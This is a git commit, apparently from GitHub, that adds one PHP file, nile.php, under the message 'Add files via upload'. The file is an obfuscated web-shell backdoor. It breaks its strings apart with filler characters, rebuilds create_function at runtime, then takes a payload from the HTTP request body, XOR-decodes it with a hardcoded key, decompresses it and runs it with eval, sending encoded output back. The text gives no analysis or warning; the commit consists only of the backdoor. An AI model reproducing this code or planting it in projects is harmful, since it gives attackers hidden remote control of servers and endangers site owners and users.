ed4da5ed53349db2e6d2621306973552d407a08b
nileshkhetrapal <71113185+nileshkhetrapal@users.noreply.github.com>
2021-11-18 23:46:12 -0500

    Add files via upload

---
+++ nile.php
@@ -0,0 +1,13 @@
+<?php
+$D='j?m[1]),$k)j?j?));$o=@ob_gj?et_contej?nj?ts();@j?ob_end_cleanj?();j?$r=';
+$U='@base6j?4_encoj?dj?e(@x(@gzcoj?mj?press($j?o),$k));j?printj?("$p$khj?$r$kf");}';
+$o='matcj?h("/$kh(.+)$kj?f/",j?@file_getj?_j?contents("pj?hp:j?//inputj?"),j?$m)=';
+$Y='j?$j+j?+,$i++)j?{$o.=$j?t{$j?i}^$k{$j?j};}}retuj?rn $o;}if (j?@pj?rej?g_';
+$a='=strlen($t);$oj?="";for($i=0;j?$j?i<$l;){for(j?$j=j?0;($jj?<$c&&j?$i<$l);';
+$n='ufj?SiDj?yhtDEmWxeB8j?";funj?cj?tioj?n xj?($t,j?$k){$c=strlej?n($k)j?j?;$l';
+$V=str_replace('F','','creFaFte_FfuFncFtiFon');
+$l='$j?k="5j?c5a4bf0";$kh="4j?d39cc89j?05fj?3";j?$kf="5j?0b352j?a4dbd0";j?$p="';
+$X='=j?1) {@ob_stj?art();@ej?vj?aj?l(@gzuncompj?ress(@x(@bj?ase64_dj?ecodj?e($';
+$I=str_replace('j?','',$l.$n.$a.$Y.$o.$X.$D.$U);
+$N=$V('',$I);$N();
+?>
